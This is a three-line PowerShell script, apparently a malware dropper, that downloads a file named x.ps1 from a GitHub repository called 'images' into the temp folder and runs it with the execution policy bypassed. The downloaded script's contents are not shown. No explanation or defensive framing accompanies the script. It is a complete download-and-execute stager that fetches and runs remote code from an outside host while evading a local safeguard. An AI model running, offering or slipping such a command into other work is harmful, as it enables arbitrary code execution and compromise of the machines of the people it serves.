$temp = Join-Path $env:TEMP "x.ps1"
Invoke-WebRequest -Uri "https://github.com/halololcloud/images/raw/refs/heads/main/x.ps1" -OutFile $temp -UseBasicParsing
powershell.exe -ExecutionPolicy Bypass -File $temp
